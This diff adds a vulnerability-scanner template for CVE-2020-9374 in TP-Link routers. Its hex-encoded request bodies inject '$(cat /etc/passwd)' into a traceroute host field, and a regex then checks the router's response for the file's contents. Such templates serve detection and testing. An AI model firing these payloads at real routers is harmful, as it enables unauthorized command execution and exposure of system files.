@@ -1,0 +1,73 @@
+id: cve-2020-9374
+info:
+  name: Command Execution in Multiple TP-LINK Routers
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Multiple models of TP-Link routers are vulnerable to a command execution flaw. Attackers can exploit this vulnerability to execute arbitrary commands, inject backdoors, gain server privileges, and take control of the entire web server.
+  reference:
+    - https://www.exploit-db.com/exploits/48155
+  classification:
+    cve-id: CVE-2020-9374
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+
+variables:
+  encoded_payload_1: "{{hex_decode('5b5452414345524f5554455f4449414723302c302c302c302c302c3023302c302c302c302c302c305d302c380d0a6d6178486f70436f756e743d32300d0a74696d656f75743d350d0a6e756d6265724f6654726965733d310d0a686f73743d222428636174202f6574632f70617373776429220d0a64617461426c6f636b53697a653d36340d0a585f54505f436f6e6e4e616d653d6577616e5f7070706f650d0a646961676e6f737469637353746174653d5265717565737465640d0a585f54505f486f705365713d300d0a0d0a')}}"
+  encoded_payload_2: "{{hex_decode('5b4143545f4f505f5452414345525423302c302c302c302c302c3023302c302c302c302c302c305d302c300d0a0d0a')}}"
+  encoded_payload_3: "{{hex_decode('5b5452414345524f5554455f4449414723302c302c302c302c302c3023302c302c302c302c302c305d302c330d0a646961676e6f737469637353746174650d0a585f54505f486f705365710d0a585f54505f526573756c740d0a0d0a')}}"
+
+http:
+  - id: initial-check
+    method: POST
+    path:
+      - "{{BaseURL}}/cgi?2"
+    headers:
+      Cookie: "Authorization=Basic REPLACEBASE64AUTH"
+      Referer: "http://{{Hostname}}/mainFrame.htm"
+    body: "{{encoded_payload_1}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "error"
+
+  - id: secondary-check
+    method: POST
+    path:
+      - "{{BaseURL}}/cgi?7"
+    headers:
+      Cookie: "Authorization=Basic REPLACEBASE64AUTH"
+      Referer: "http://{{Hostname}}/mainFrame.htm"
+    body: "{{encoded_payload_2}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "error"
+
+  - id: final-check
+    method: POST
+    path:
+      - "{{BaseURL}}/cgi?1"
+    headers:
+      Cookie: "Authorization=Basic REPLACEBASE64AUTH"
+      Referer: "http://{{Hostname}}/mainFrame.htm"
+    body: "{{encoded_payload_3}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "X_TP_Result=admin:(.*?):/bin/\\w*sh"
